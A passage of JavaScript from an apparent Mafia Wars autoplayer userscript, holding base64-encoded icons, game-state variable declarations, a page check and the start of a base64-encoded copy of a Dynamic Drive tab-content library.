    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACgUlEQVR42pWST0gUURzHv29n/7S7rpuhlroW/kFdobQ8qBgdxItWB6NDkVAdukREWdShEr3YHyiicwQlJRJJEP2hOoVmapq1qbEuaWq7Cu6s6+7O' +
    'jLuz7zU7I1aYZXP5vWHm++Hzvu8R/OURJ15YGZWZJXePsNo/ZLUPYc9jS0ykQ0yWKKen2+1bG8T/AoS+tLf4J4UmeVFEaqaueX3Z8ZY1AxZGbm+e9y2OJttDFqoAeB+N2NMNRWm7mqbXBOAHb7YHJkMHHPnzYDEJ' +
    'YwNMsdA/yKi7deifgOCnqzu9I+E3jnyeuH0S5KiEApsE9wBYdpGlKrO+rWdVwMLHZl2El/pEPliWlRfAjYdALCbiTG0QnveA2Wbqs9qNFVkHn7A/Avjes0fH+4N3nBVz0FEB1zoAWQGcqwtCDkvoeUZQXLnh8JZj' +
    'b++tAPi7T9v8EwG3ycRvSncEwaR5NN8NKR2EcGmvABbX4duoEYJg86bnpBXmnugP/waYfXnkytd+//mSqilQYQosGsHlTgPMBuBkjWIcJ6CyDl3PzXCWp7XmN7ouLANmnzbkTrrmhrMcnnW2pO8AUwKUoMtDYOKA' +
    'sgxOMSCqBT/DYdxtlnJKHMV5p96Nq4CJttrO6aGx+m2VXk0nUREjGJll6rooRa8aJABMJhjoNsJRkPrIefHzfuLt2F3teuV5XVrpJWYrU7NY6rixnVPn9X3QwgokARLDBIO9RuYsz64mrtaSD8Kct7Rwx6KyHy3J' +
    'mFZNnFDVRBfVa2GasNBg7mEOJmvyIBlqyuOn3ZGUFVeK/TqJOjU7srRFICPTwBPf/ZokvSV5I8D9PJPlMFH7VN/p0poSDRKniIYCMz8A9QcpP1oZxJMAAAAASUVORK5CYIIK' +
    '" />';

var chickenIcon = '<img src="data:image/gif;base64,' +
    'R0lGODdhEAAQAMYAAAQCBKSKBHQCBEQ2FNTKDEwCBDQyTCQaBIyKvHxiDMzOzExOTBwaNCQCBFw+BPTmBHx6fPS+BDQmBExKfLy+BCQmJKSm3Hx+BAwOHMyaBKQCBExKHDwmDDQyZBwaHPTy9FxaXPz+BKSWBDQy' +
    'PPzKBGQCBJyavIRuDExOZCQmNCQWFGROBPzyBMQCBDw+ZBweHAwKDLSKBEwyBFQCBHxmBNze3FRSVDQCBGQ+DPzmBHx+fFxajLy+vJxyBBQSFLQCBBwaJPz+/PzWBJyazCwqRDw+dAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAHi4AAgoMAL4SHiDclM4iNGi0FjYcwLT+SkyUCMJeDJhUNE4Obgh6EFiguRRg6hoQeNUEQPgg7qzwKhzpBuhUGGx48t4QwNrsf' +
    'CyI5AwoKpYQ+IDogEiE5MT6XEgEPIUIRGT0Ho4QEFxQsJD0OOByNEisJJwkyHtiIIxYmLhISHkQdHeyJYkCwYMFBgQAAOw==' +
    '" />';

var hideIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/AP////8zM/f39+3t7YCAgOXl5fX19fT09BkZGdPT0xUVFbS0tMvLy4eHh/9LS/v7++Hh4aAVEtvb2/j4+M9NTKQWFMcuLDw8PMMcGkpKSrq6uqQVFKkXFawYFsYcGqAUEqcmI5GRkf7+/qen' +
    'p6+vr/Pz87u7uwMDA/9ra/5ycmNjY2lpaf5HR8gdGs3Nzf+Hh8AbGtLS0vr6+psUEdjY2NnZ2dJOTP/b26MWE+fn56cWFL0bGKsXFa4YFp0UEgAAACH5BAEAAD8ALAAAAAAQABAAAAaYwJ9wSCwaA8ikkRhoeTyY' +
    'wFKoQNkoFpiUqFCNCoJwgbCTIhDCDOAhAAAMgwQhREgwSD+FyO2G1wYCEwYQDEIPfAIDEoAAMm8JQhp8BTk0A3wAAgVCDm4CBAQml3wHmz8BNwApAT08BAUHsS4EQw0ADQEdOjgRLGdFFwAxATwVID5bRSclAA4c' +
    'Gx8zyUULAC9JSFMrAAtTQkEAOw==' +
    '" />';

var bgTabImage =  '<img src="http://playerscripts.co.uk/images/mwap_graphics/generaltabimage.png" />';

var checkedIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOYAAAAAAP///1pdWVlcWF5hXV1gXFteWi0xKz5CPCcpJmNnYVPwAFLuAFHsAFHqAFDoAE/mAE/kAE7iAEvYAEnUAEXIAETGAETEAEPCAELAAEG8AD+2AD60AD2yAD2wADusADuqADiiADOUAC+I' +
    'AC6EACyAACt+ACt8AD6vAS6DAS6CASyAASp5AUW5CEODIkJ3JVKRMVGOMFOSMlKQMVSUM1GLMl6TQ1mJP2WYSlJ0PzM1MYODg4KCgoGBgX9/f35+fn19fXt7e3p6enl5eXh4eHZ2dnV1dXNzc3Jycl9fX11dXVtb' +
    'W1paWllZWVhYWFdXV1ZWVlNTU09PTzk5OTQ0NDAwMC0tLSgoKCQkJCIiIiEhIR8fHx0dHRsbG////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAF4ALAAAAAAQABAAAAergF6Cg4SFhoeIiYqLSY1KS09PUFFSLi+ESTs8PT4/QUJDNBUYhEs8nUBBQ0QyFgsQHINPP56rRjAYDAwbI4M5' +
    'OEJERUczuQ0cKYQtEzZHSDEZDg4cKjqDGBAMKDc1Gg4PHSoEVoMaFAsPFxUQDx4rBUpXhB4VDQ4QER4lBktMWIQIQmiAIOGDCQFNnDzJQmiKAhEeQJwYoHASF0JUqhwgwSIBFi1buHDpIigQADs=' +
    '" />';

var unCheckedIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOYAAAAAAP///4ODg4KCgoGBgX9/f35+fn19fXt7e3p6enl5eXh4eHZ2dnV1dXNzc3JycnFxcXBwcG5ubm1tbWxsbGtra2lpaWhoaGdnZ2VlZWRkZGNjY2JiYmFhYWBgYF9fX11dXVxcXFtbW1pa' +
    'WllZWVhYWFdXV1ZWVlNTU1BQUE9PT05OTkpKSkhISEVFRUREREFBQT4+Pjo6Ojk5OTU1NTQ0NDMzMzAwMC0tLSoqKigoKCcnJyQkJCIiIiEhIR8fHx0dHRsbG////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEIALAAAAAAQABAAAAeUgEKCg4SFhoeIiYqLH40gIiYmJygqKyyEHwIDBAUGCAkKDA4uhCIDnQcICgsNDxEwhCYGnqutEBIUMoQnnwui' +
    'txQVFzSEKaEOrhMUFhgZNoQrrRG4FhcZHB44hC3A1dcdHyA6hC8TFcwaGx6PIzyEMd7YICEkJSY9hDPXHh8hIvaTgBCqcQNHDh07ePj4AQRIEEGBAAA7' +
    '" />';

const noDelay = 0;              // No delay on commands
const minDelay = 1000;          // Minimum delay on commands
var running;                    // Is the autoplayer running?
var innerPageElt;               // The currently visible inner page
var appLayoutElt;               // The currently visible content page
var mastheadElt;                // Masthead content
var statsrowElt;                // statsrow content
var menubarElt;                 // menubar content
var popupfodderElt;             // popupfodder Element
var cashElt;                    // Cash array of values by city
var healthElt, health;          // Health DOM element and value
var maxHealthElt, maxHealth;    // Maximum health DOM element and value
var energyElt, energy;          // Energy DOM element and value
var maxEnergyElt, maxEnergy;    // Maximum energy DOM element and value
var staminaElt, stamina;        // Stamina DOM element and value
var maxStaminaElt, maxStamina;  // Maximum stamina DOM element and value
var levelElt, level;            // Level DOM element and value
var curAttack;                  // Current Attack stat value
var curDefense;                 // Current Defense stat value
var curAttackEquip;             // Current Attack equip value
var curDefenseEquip;            // Current Defense equip value
var prevAttackEquip;
var prevDefenseEquip;
var curExpElt, curExp;          // Experience DOM element and value
var lvlExpElt, lvlExp;          // Level up experience DOM element and value
var energyPackElt, energyPack;  // Is an energy pack waiting?
var ptsToNextLevel;             // Experience to next level up
var mafia;                      // Mafia size
var invites;                    // Number of mafia invitations
var stats;                      // Skill points
var city;                       // Current city (0=New York, 1=Cuba, 2=Moscow)
var skipStaminaSpend = false;   // Skip stamina actions for now?

var Miss_Name;                  // mission Name holder
var Miss_Name_is;
var Miss_ID;                    // a holder to move the mission tag around
var Miss_Slot;                  // a holder to move around the mission slot 0-3
var MyMafiaJobs;                // name to use in misssions
var Miss_Energy;                //
var Miss_Nrg_Req = 0;
var Miss_Stamina;               //
var Miss_Stam_Req = 0;
var Miss_Pay_Exp;
var Miss_Pay_Cash;
var missionsDelays = 2000;
//
var clickAction;                // Action being attempted with click simulation
var clickContext;               // Context for clickAction
var modificationTimer;          // Timer used to wait for content changes
var ajaxAction;                 // Action being attempted with do_ajax (asynchronous)
var ajaxContext;                // Context for ajaxContext
var popupTimer;                 // setInterval timer for handlePopups()
var helpWar = false;            // Helping a friend's war?
var idle = true;                // Is the script currently idle?
var lastOpponent;               // Last opponent fought (object)
var suspendBank = false;        // Suspend banking for a while
var skipJobs = false;           // Skip doing jobs for a while
var jobOptimizeOn = false;      // Is job optimizing flag
var newStaminaMode;             // New stamina mode for random fighting
var checkOnWar;
var jobid;
var tst_ver;                    // for making version note changes
var mmis_time = '00:00:30';
var deflt_num_fight = 501;
var deflt_num_fight_st = '501' ;

var new_header = xpathFirst('//div[@class="header_top_row"]') ? true : false; // checks for new header

if (!initialized && !checkInPublishPopup() && !checkLoadIframe() &&
    (/inthemafia/.test(document.referrer) ||
     /facebook\.mafiawars\.com/.test(window.location.href))) {
  var tabURI =
    "Ly8qKiBUYWIgQ29udGVudCBzY3JpcHQgdjIuMC0gqSBEeW5hbWljIERyaXZlIERIVE1MIGNvZGUgbGlicmFyeSAoaHR0cDovL3d3dy5keW5hbWljZHJpdmUuY29tKQ0KLy8qKiBVcGRhdGVkIE9jdCA3dGgsIDA3" +
    "IHRvIHZlcnNpb24gMi4wLiBDb250YWlucyBudW1lcm91cyBpbXByb3ZlbWVudHM6DQovLyAgIC1BZGRlZCBBdXRvIE1vZGU6IFNjcmlwdCBhdXRvIHJvdGF0ZXMgdGhlIHRhYnMgYmFzZWQgb24gYW4gaW50ZXJ2" +
    "YWwsIHVudGlsIGEgdGFiIGlzIGV4cGxpY2l0bHkgc2VsZWN0ZWQNCi8vICAgLUFiaWxpdHkgdG8gZXhwYW5kL2NvbnRyYWN0IGFyYml0cmFyeSBESVZzIG9uIHRoZSBwYWdlIGFzIHRoZSB0YWJiZWQgY29udGVu" +
    "dCBpcyBleHBhbmRlZC8gY29udHJhY3RlZA0KLy8gICAtQWJpbGl0eSB0byBkeW5hbWljYWxseSBzZWxlY3QgYSB0YWIgZWl0aGVyIGJhc2VkIG9uIGl0cyBwb3NpdGlvbiB3aXRoaW4gaXRzIHBlZXJzLCBvciBp" +
    "dHMgSUQgYXR0cmlidXRlIChnaXZlIHRoZSB0YXJnZXQgdGFiIG9uZSAxc3QpDQovLyAgIC1BYmlsaXR5IHRvIHNldCB3aGVyZSB0aGUgQ1NTIGNsYXNzbmFtZSAic2VsZWN0ZWQiIGdldCBhc3NpZ25lZC0gZWl0" +
    "aGVyIHRvIHRoZSB0YXJnZXQgdGFiJ3MgbGluayAoIkEiKSwgb3IgaXRzIHBhcmVudCBjb250YWluZXINCi8vKiogVXBkYXRlZCBGZWIgMTh0aCwgMDggdG8gdmVyc2lvbiAyLjE6IEFkZHMgYSAidGFiaW5zdGFu" +
    "Y2UuY3ljbGVpdChkaXIpIiBtZXRob2QgdG8gY3ljbGUgZm9yd2FyZCBvciBiYWNrd2FyZCBiZXR3ZWVuIHRhYnMgZHluYW1pY2FsbHkNCi8vKiogVXBkYXRlZCBBcHJpbCA4dGgsIDA4IHRvIHZlcnNpb24gMi4y" +
    "OiBBZGRzIHN1cHBvcnQgZm9yIGV4cGFuZGluZyBhIHRhYiB1c2luZyBhIFVSTCBwYXJhbWV0ZXIgKGllOiBodHRwOi8vbXlzaXRlLmNvbS90YWJjb250ZW50Lmh0bT90YWJpbnRlcmZhY2VpZD0wKSANCg0KLy8v" +
    "L05PIE5FRUQgVE8gRURJVCBCRUxPVy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQpmdW5jdGlvbiBkZHRhYmNvbnRlbnQodGFiaW50ZXJmYWNlaWQpew0KCXRoaXMudGFiaW50ZXJmYWNlaWQ9dGFiaW50ZXJm" +
    "YWNlaWQgLy9JRCBvZiBUYWIgTWVudSBtYWluIGNvbnRhaW5lcg0KCXRoaXMudGFicz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCh0YWJpbnRlcmZhY2VpZCkuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImEiKSAvL0dl" +
    "dCBhbGwgdGFiIGxpbmtzIHdpdGhpbiBjb250YWluZXINCgl0aGlzLmVuYWJsZXRhYnBlcnNpc3RlbmNlPXRydWUNCgl0aGlzLmhvdHRhYnNwb3NpdGlvbnM9W10gLy9BcnJheSB0byBzdG9yZSBwb3NpdGlvbiBv" +
    "ZiB0YWJzIHRoYXQgaGF2ZSBhICJyZWwiIGF0dHIgZGVmaW5lZCwgcmVsYXRpdmUgdG8gYWxsIHRhYiBsaW5rcywgd2l0aGluIGNvbnRhaW5lcg0KCXRoaXMuY3VycmVudFRhYkluZGV4PTAgLy9JbmRleCBvZiBj" +
    "dXJyZW50bHkgc2VsZWN0ZWQgaG90IHRhYiAodGFiIHdpdGggc3ViIGNvbnRlbnQpIHdpdGhpbiBob3R0YWJzcG9zaXRpb25zW10gYXJyYXkNCgl0aGlzLnN1YmNvbnRlbnRpZHM9W10gLy9BcnJheSB0byBzdG9y" +
    "ZSBpZHMgb2YgdGhlIHN1YiBjb250ZW50cyAoInJlbCIgYXR0ciB2YWx1ZXMpDQoJdGhpcy5yZXZjb250ZW50aWRzPVtdIC8vQXJyYXkgdG8gc3RvcmUgaWRzIG9mIGFyYml0cmFyeSBjb250ZW50cyB0byBleHBh" +
    "bmQvY29udGFjdCBhcyB3ZWxsICgicmV2IiBhdHRyIHZhbHVlcykNCgl0aGlzLnNlbGVjdGVkQ2xhc3NUYXJnZXQ9ImxpbmsiIC8va2V5d29yZCB0byBpbmRpY2F0ZSB3aGljaCB0YXJnZXQgZWxlbWVudCB0byBh" +
    "c3NpZ24gInNlbGVjdGVkIiBDU1MgY2xhc3MgKCJsaW5rcGFyZW50IiBvciAibGluayIpDQp9DQoNCmRkdGFiY29udGVudC5nZXRDb29raWU9ZnVuY3Rpb24oTmFtZSl7IA0KCXZhciByZT1uZXcgUmVnRXhwKE5h" +
    "bWUrIj1bXjtdKyIsICJpIik7IC8vY29uc3RydWN0IFJFIHRvIHNlYXJjaCBmb3IgdGFyZ2V0IG5hbWUvdmFsdWUgcGFpcg0KCWlmIChkb2N1bWVudC5jb29raWUubWF0Y2gocmUpKSAvL2lmIGNvb2tpZSBmb3Vu" +
    "ZA0KCQlyZXR1cm4gZG9jdW1lbnQuY29va2llLm1hdGNoKHJlKVswXS5zcGxpdCgiPSIpWzFdIC8vcmV0dXJuIGl0cyB2YWx1ZQ0KCXJldHVybiAiIg0KfQ0KDQpkZHRhYmNvbnRlbnQuc2V0Q29va2llPWZ1bmN0" +
    "aW9uKG5hbWUsIHZhbHVlKXsNCglkb2N1bWVudC5jb29raWUgPSBuYW1lKyI9Iit2YWx1ZSsiO3BhdGg9LyIgLy9jb29raWUgdmFsdWUgaXMgZG9tYWluIHdpZGUgKHBhdGg9LykNCn0NCg0KZGR0YWJjb250ZW50" +
    "LnByb3RvdHlwZT17DQoNCglleHBhbmRpdDpmdW5jdGlvbih0YWJpZF9vcl9wb3NpdGlvbil7IC8vUFVCTElDIGZ1bmN0aW9uIHRvIHNlbGVjdCBhIHRhYiBlaXRoZXIgYnkgaXRzIElEIG9yIHBvc2l0aW9uKGlu" +
    "dCkgd2l0aGluIGl0cyBwZWVycw0KCQl0aGlzLmNhbmNlbGF1dG9ydW4oKSAvL3N0b3AgYXV0byBjeWNsaW5nIG9mIHRhYnMgKGlmIHJ1bm5pbmcpDQoJCXZhciB0YWJyZWY9IiINCgkJdHJ5ew0KCQkJaWYgKHR5" +
    "cGVvZiB0YWJpZF9vcl9wb3NpdGlvbj09InN0cmluZyIgJiYgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQodGFiaWRfb3JfcG9zaXRpb24pLmdldEF0dHJpYnV0ZSgicmVsIikpIC8vaWYgc3BlY2lmaWVkIHRhYiBj" +
    "b250YWlucyAicmVsIiBhdHRyDQoJCQkJdGFicmVmPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHRhYmlkX29yX3Bvc2l0aW9uKQ0KCQkJZWxzZSBpZiAocGFyc2VJbnQodGFiaWRfb3JfcG9zaXRpb24pIT1OYU4g" +
    "JiYgdGhpcy50YWJzW3RhYmlkX29yX3Bvc2l0aW9uXS5nZXRBdHRyaWJ1dGUoInJlbCIpKSAvL2lmIHNwZWNpZmllZCB0YWIgY29udGFpbnMgInJlbCIgYXR0cg0KCQkJCXRhYnJlZj10aGlzLnRhYnNbdGFiaWRf" +
    "b3JfcG9zaXRpb25dDQoJCX0NCgkJY2F0Y2goZXJyKXthbGVydCgiSW52YWxpZCBUYWIgSUQgb3IgcG9zaXRpb24gZW50ZXJlZCEiKX0NCgkJaWYgKHRhYnJlZiE9IiIpIC8vaWYgYSB2YWxpZCB0YWIgaXMgZm91" +
    "bmQgYmFzZWQgb24gZnVuY3Rpb24gcGFyYW1ldGVyDQoJCQl0aGlzLmV4cGFuZHRhYih0YWJyZWYpIC8vZXhwYW5kIHRoaXMgdGFiDQoJfSwNCg0KCWN5Y2xlaXQ6ZnVuY3Rpb24oZGlyLCBhdXRvcnVuKXsgLy9Q" +
    "VUJMSUMgZnVuY3Rpb24gdG8gbW92ZSBmb3dhcmQgb3IgYmFja3dhcmRzIHRocm91Z2ggZWFjaCBob3QgdGFiICh0YWJpbnN0YW5jZS5jeWNsZWl0KCdmb3dhcmQvYmFjaycpICkNCgkJaWYgKGRpcj09Im5leHQi" +
    "KXsNCgkJCXZhciBjdXJyZW50VGFiSW5kZXg9KHRoaXMuY3VycmVudFRhYkluZGV4PHRoaXMuaG90dGFic3Bvc2l0aW9ucy5sZW5ndGgtMSk/IHRoaXMuY3VycmVudFRhYkluZGV4KzEgOiAwDQoJCX0NCgkJZWxz" +
    "ZSBpZiAoZGlyPT0icHJldiIpew0KCQkJdmFyIGN1cnJlbnRUYWJJbmRleD0odGhpcy5jdXJyZW50VGFiSW5kZXg+MCk/IHRoaXMuY3VycmVudFRhYkluZGV4LTEgOiB0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVu" +
    "Z3RoLTENCgkJfQ0KCQlpZiAodHlwZW9mIGF1dG9ydW49PSJ1bmRlZmluZWQiKSAvL2lmIGN5Y2xlaXQoKSBpcyBiZWluZyBjYWxsZWQgYnkgdXNlciwgdmVyc3VzIGF1dG9ydW4oKSBmdW5jdGlvbg0KCQkJdGhp" +
    "cy5jYW5jZWxhdXRvcnVuKCkgLy9zdG9wIGF1dG8gY3ljbGluZyBvZiB0YWJzIChpZiBydW5uaW5nKQ0KCQl0aGlzLmV4cGFuZHRhYih0aGlzLnRhYnNbdGhpcy5ob3R0YWJzcG9zaXRpb25zW2N1cnJlbnRUYWJJ" +
    "bmRleF1dKQ0KCX0sDQoNCglzZXRwZXJzaXN0OmZ1bmN0aW9uKGJvb2wpeyAvL1BVQkxJQyBmdW5jdGlvbiB0byB0b2dnbGUgcGVyc2lzdGVuY2UgZmVhdHVyZQ0KCQkJdGhpcy5lbmFibGV0YWJwZXJzaXN0ZW5j" +
    "ZT1ib29sDQoJfSwNCg0KCXNldHNlbGVjdGVkQ2xhc3NUYXJnZXQ6ZnVuY3Rpb24ob2Jqc3RyKXsgLy9QVUJMSUMgZnVuY3Rpb24gdG8gc2V0IHdoaWNoIHRhcmdldCBlbGVtZW50IHRvIGFzc2lnbiAic2VsZWN0" +
    "ZWQiIENTUyBjbGFzcyAoImxpbmtwYXJlbnQiIG9yICJsaW5rIikNCgkJdGhpcy5zZWxlY3RlZENsYXNzVGFyZ2V0PW9ianN0ciB8fCAibGluayINCgl9LA0KDQoJZ2V0c2VsZWN0ZWRDbGFzc1RhcmdldDpmdW5j" +
    "dGlvbih0YWJyZWYpeyAvL1JldHVybnMgdGFyZ2V0IGVsZW1lbnQgdG8gYXNzaWduICJzZWxlY3RlZCIgQ1NTIGNsYXNzIHRvDQoJCXJldHVybiAodGhpcy5zZWxlY3RlZENsYXNzVGFyZ2V0PT0oImxpbmtwYXJl" +
    "bnQiLnRvTG93ZXJDYXNlKCkpKT8gdGFicmVmLnBhcmVudE5vZGUgOiB0YWJyZWYNCgl9LA0KDQoJdXJscGFyYW1zZWxlY3Q6ZnVuY3Rpb24odGFiaW50ZXJmYWNlaWQpew0KCQl2YXIgcmVzdWx0PXdpbmRvdy5s" +
    "b2NhdGlvbi5zZWFyY2gubWF0Y2gobmV3IFJlZ0V4cCh0YWJpbnRlcmZhY2VpZCsiPShcXGQrKSIsICJpIikpIC8vY2hlY2sgZm9yICI/dGFiaW50ZXJmYWNlaWQ9MiIgaW4gVVJMDQoJCXJldHVybiAocmVzdWx0" +
    "PT1udWxsKT8gbnVsbCA6IHBhcnNlSW50KFJlZ0V4cC4kMSkgLy9yZXR1cm5zIG51bGwgb3IgaW5kZXgsIHdoZXJlIGluZGV4IChpbnQpIGlzIHRoZSBzZWxlY3RlZCB0YWIncyBpbmRleA0KCX0sDQoNCglleHBh" +
    "bmR0YWI6ZnVuY3Rpb24odGFicmVmKXsNCgkJdmFyIHN1YmNvbnRlbnRpZD10YWJyZWYuZ2V0QXR0cmlidXRlKCJyZWwiKSAvL0dldCBpZCBvZiBzdWJjb250ZW50IHRvIGV4cGFuZA0KCQkvL0dldCAicmV2IiBh" +
    "dHRyIGFzIGEgc3RyaW5nIG9mIElEcyBpbiB0aGUgZm9ybWF0ICIsam9obixnZW9yZ2UsdHJleSxldGMsIiB0byBlYXNpbHkgc2VhcmNoIHRocm91Z2gNCgkJdmFyIGFzc29jaWF0ZWRyZXZpZHM9KHRhYnJlZi5n" +
    "ZXRBdHRyaWJ1dGUoInJldiIpKT8gIiwiK3RhYnJlZi5nZXRBdHRyaWJ1dGUoInJldiIpLnJlcGxhY2UoL1xzKy8sICIiKSsiLCIgOiAiIg0KCQl0aGlzLmV4cGFuZHN1YmNvbnRlbnQoc3ViY29udGVudGlkKQ0K" +
    "CQl0aGlzLmV4cGFuZHJldmNvbnRlbnQoYXNzb2NpYXRlZHJldmlkcykNCgkJZm9yICh2YXIgaT0wOyBpPHRoaXMudGFicy5sZW5ndGg7IGkrKyl7IC8vTG9vcCB0aHJvdWdoIGFsbCB0YWJzLCBhbmQgYXNzaWdu" +
    "IG9ubHkgdGhlIHNlbGVjdGVkIHRhYiB0aGUgQ1NTIGNsYXNzICJzZWxlY3RlZCINCgkJCXRoaXMuZ2V0c2VsZWN0ZWRDbGFzc1RhcmdldCh0aGlzLnRhYnNbaV0pLmNsYXNzTmFtZT0odGhpcy50YWJzW2ldLmdl" +
    "dEF0dHJpYnV0ZSgicmVsIik9PXN1YmNvbnRlbnRpZCk/ICJzZWxlY3RlZCIgOiAiIg0KCQl9DQoJCWlmICh0aGlzLmVuYWJsZXRhYnBlcnNpc3RlbmNlKSAvL2lmIHBlcnNpc3RlbmNlIGVuYWJsZWQsIHNhdmUg" +
    "c2VsZWN0ZWQgdGFiIHBvc2l0aW9uKGludCkgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQlkZHRhYmNvbnRlbnQuc2V0Q29va2llKHRoaXMudGFiaW50ZXJmYWNlaWQsIHRhYnJlZi50YWJwb3NpdGlvbikNCgkJ" +
    "dGhpcy5zZXRjdXJyZW50dGFiaW5kZXgodGFicmVmLnRhYnBvc2l0aW9uKSAvL3JlbWVtYmVyIHBvc2l0aW9uIG9mIHNlbGVjdGVkIHRhYiB3aXRoaW4gaG90dGFic3Bvc2l0aW9uc1tdIGFycmF5DQoJfSwNCg0K" +
    "CWV4cGFuZHN1YmNvbnRlbnQ6ZnVuY3Rpb24oc3ViY29udGVudGlkKXsNCgkJZm9yICh2YXIgaT0wOyBpPHRoaXMuc3ViY29udGVudGlkcy5sZW5ndGg7IGkrKyl7DQoJCQl2YXIgc3ViY29udGVudD1kb2N1bWVu" +
    "dC5nZXRFbGVtZW50QnlJZCh0aGlzLnN1YmNvbnRlbnRpZHNbaV0pIC8vY2FjaGUgY3VycmVudCBzdWJjb250ZW50IG9iaiAoaW4gZm9yIGxvb3ApDQoJCQlzdWJjb250ZW50LnN0eWxlLmRpc3BsYXk9KHN1YmNv" +
    "bnRlbnQuaWQ9PXN1YmNvbnRlbnRpZCk/ICJibG9jayIgOiAibm9uZSIgLy8ic2hvdyIgb3IgaGlkZSBzdWIgY29udGVudCBiYXNlZCBvbiBtYXRjaGluZyBpZCBhdHRyIHZhbHVlDQoJCX0NCgl9LA0KDQoJZXhw" +
    "YW5kcmV2Y29udGVudDpmdW5jdGlvbihhc3NvY2lhdGVkcmV2aWRzKXsNCgkJdmFyIGFsbHJldmlkcz10aGlzLnJldmNvbnRlbnRpZHMNCgkJZm9yICh2YXIgaT0wOyBpPGFsbHJldmlkcy5sZW5ndGg7IGkrKyl7" +
    "IC8vTG9vcCB0aHJvdWdoIHJldiBhdHRyaWJ1dGVzIGZvciBhbGwgdGFicyBpbiB0aGlzIHRhYiBpbnRlcmZhY2UNCgkJCS8vaWYgYW55IHZhbHVlcyBzdG9yZWQgd2l0aGluIGFzc29jaWF0ZWRyZXZpZHMgbWF0" +
    "Y2hlcyBvbmUgd2l0aGluIGFsbHJldmlkcywgZXhwYW5kIHRoYXQgRElWLCBvdGhlcndpc2UsIGNvbnRyYWN0IGl0DQoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZChhbGxyZXZpZHNbaV0pLnN0eWxlLmRpc3Bs" +
    "YXk9KGFzc29jaWF0ZWRyZXZpZHMuaW5kZXhPZigiLCIrYWxscmV2aWRzW2ldKyIsIikhPS0xKT8gImJsb2NrIiA6ICJub25lIg0KCQl9DQoJfSwNCg0KCXNldGN1cnJlbnR0YWJpbmRleDpmdW5jdGlvbih0YWJw" +
    "b3NpdGlvbil7IC8vc3RvcmUgY3VycmVudCBwb3NpdGlvbiBvZiB0YWIgKHdpdGhpbiBob3R0YWJzcG9zaXRpb25zW10gYXJyYXkpDQoJCWZvciAodmFyIGk9MDsgaTx0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVu" +
    "Z3RoOyBpKyspew0KCQkJaWYgKHRhYnBvc2l0aW9uPT10aGlzLmhvdHRhYnNwb3NpdGlvbnNbaV0pew0KCQkJCXRoaXMuY3VycmVudFRhYkluZGV4PWkNCgkJCQlicmVhaw0KCQkJfQ0KCQl9DQoJfSwNCg0KCWF1" +
    "dG9ydW46ZnVuY3Rpb24oKXsgLy9mdW5jdGlvbiB0byBhdXRvIGN5Y2xlIHRocm91Z2ggYW5kIHNlbGVjdCB0YWJzIGJhc2VkIG9uIGEgc2V0IGludGVydmFsDQoJCXRoaXMuY3ljbGVpdCgnbmV4dCcsIHRydWUp" +
    "DQoJfSwNCg0KCWNhbmNlbGF1dG9ydW46ZnVuY3Rpb24oKXsNCgkJaWYgKHR5cGVvZiB0aGlzLmF1dG9ydW50aW1lciE9InVuZGVmaW5lZCIpDQoJCQljbGVhckludGVydmFsKHRoaXMuYXV0b3J1bnRpbWVyKQ0K" +
    "CX0sDQoNCglpbml0OmZ1bmN0aW9uKGF1dG9tb2RlcGVyaW9kKXsNCgkJdmFyIHBlcnNpc3RlZHRhYj1kZHRhYmNvbnRlbnQuZ2V0Q29va2llKHRoaXMudGFiaW50ZXJmYWNlaWQpIC8vZ2V0IHBvc2l0aW9uIG9m" +
    "IHBlcnNpc3RlZCB0YWIgKGFwcGxpY2FibGUgaWYgcGVyc2lzdGVuY2UgaXMgZW5hYmxlZCkNCgkJdmFyIHNlbGVjdGVkdGFiPS0xIC8vQ3VycmVudGx5IHNlbGVjdGVkIHRhYiBpbmRleCAoLTEgbWVhbmluZyBu" +
    "b25lKQ0KCQl2YXIgc2VsZWN0ZWR0YWJmcm9tdXJsPXRoaXMudXJscGFyYW1zZWxlY3QodGhpcy50YWJpbnRlcmZhY2VpZCkgLy9yZXR1cm5zIG51bGwgb3IgaW5kZXggZnJvbTogdGFiY29udGVudC5odG0/dGFi" +
    "aW50ZXJmYWNlaWQ9aW5kZXgNCgkJdGhpcy5hdXRvbW9kZXBlcmlvZD1hdXRvbW9kZXBlcmlvZCB8fCAwDQoJCWZvciAodmFyIGk9MDsgaTx0aGlzLnRhYnMubGVuZ3RoOyBpKyspew0KCQkJdGhpcy50YWJzW2ld" +
